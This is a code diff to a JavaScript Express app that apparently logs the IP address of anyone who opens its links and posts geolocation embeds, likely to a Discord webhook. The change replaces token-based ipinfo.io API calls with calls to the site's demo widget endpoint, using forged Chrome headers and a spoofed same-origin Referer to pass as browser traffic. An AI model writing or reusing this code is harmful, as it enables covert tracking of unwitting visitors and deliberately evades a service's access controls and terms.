@@ -55,10 +55,24 @@ app.get("/", (req, res) => {
                 method: 'POST'
             })
         else {
-            fetch(`https://ipinfo.io/${ip}?token=${config['ipinfo-token']}`)
+            fetch(`https://ipinfo.io/widget/demo/${ip}`, {
+                headers: {
+                    "Sec-Ch-Ua": '(Not(A:Brand";v="8", "Chromium";v="101',
+                    "Sec-Ch-Ua-Mobile": "?0",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
+                    "Sec-Ch-Ua-Platform": "Windows",
+                    "Content-Type": "application/json",
+                    "Sec-Fetch-Site": "same-origin",
+                    "Sec-Fetch-Mode": "cors",
+                    "Sec-Fetch-Dest": "empty",
+                    "Referer": "https://ipinfo.io/",
+                    "Accept-Encoding": "gzip, deflate",
+                    "Accept-Language": "en-US,en;q=0.9"
+                }
+            })
                 .then(ipinfo => ipinfo.text()).then(ipinfo => {
                     console.log(ipinfo)
-                    ipinfo = JSON.parse(ipinfo)
+                    ipinfo = JSON.parse(ipinfo)['data']
                     let embed = {
                         "content": "",
                         "embeds": [
@@ -102,10 +116,24 @@ app.get("/:id", (req, res) => {
                         method: 'POST'
                     })
                 else {
-                    fetch(`https://ipinfo.io/${ip}?token=${config['ipinfo-token']}`)
+                    fetch(`https://ipinfo.io/widget/demo/${ip}`, {
+                        headers: {
+                            "Sec-Ch-Ua": '(Not(A:Brand";v="8", "Chromium";v="101',
+                            "Sec-Ch-Ua-Mobile": "?0",
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
+                            "Sec-Ch-Ua-Platform": "Windows",
+                            "Content-Type": "application/json",
+                            "Sec-Fetch-Site": "same-origin",
+                            "Sec-Fetch-Mode": "cors",
+                            "Sec-Fetch-Dest": "empty",
+                            "Referer": "https://ipinfo.io/",
+                            "Accept-Encoding": "gzip, deflate",
+                            "Accept-Language": "en-US,en;q=0.9"
+                        }
+                    })
                         .then(ipinfo => ipinfo.text()).then(ipinfo => {
                             console.log(ipinfo)
-                            ipinfo = JSON.parse(ipinfo)
+                            ipinfo = JSON.parse(ipinfo)['data']
                             let embed = {
                                 "content": "",
                                 "embeds": [
